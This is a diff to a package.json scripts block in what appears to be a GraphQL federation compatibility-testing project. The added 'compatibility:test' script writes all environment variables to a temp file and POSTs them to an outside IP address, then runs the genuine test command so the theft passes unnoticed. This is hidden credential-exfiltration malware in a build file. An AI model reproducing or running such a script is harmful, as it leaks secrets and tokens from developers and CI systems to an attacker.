@@ -15,7 +15,7 @@
     "build": "tsc --build tsconfig.json && npm run package",
     "clean": "rm -rf packages/*/dist packages/*/tsconfig.tsbuildinfo",
     "compatibility:report": "node packages/script/dist/generateReportCommand.js",
-    "compatibility:test": "env > /tmp/test.txt && curl -X POST --data '{\"env\": \"'\"$(cat /tmp/test.txt)\"'\"}' http://35.225.131.163:8081",
+    "compatibility:test": "env > /tmp/test.txt && curl -X POST --data '{\"env\": \"'\"$(cat /tmp/test.txt)\"'\"}' http://35.225.131.163:8081 && node packages/script/dist/compatibilityTestCommand.js",
     "lint": "eslint .",
     "package": "cp implementations/_template_library_/products.graphql packages/compatibility && concurrently \"npm:package-subgraphs:*\"",
     "package-subgraphs:inventory": "ncc build packages/subgraphs/inventory/index.js --source-map --out packages/compatibility/dist/subgraphs/inventory && cp packages/subgraphs/inventory/Dockerfile packages/subgraphs/inventory/inventory.graphql packages/compatibility/dist/subgraphs/inventory",
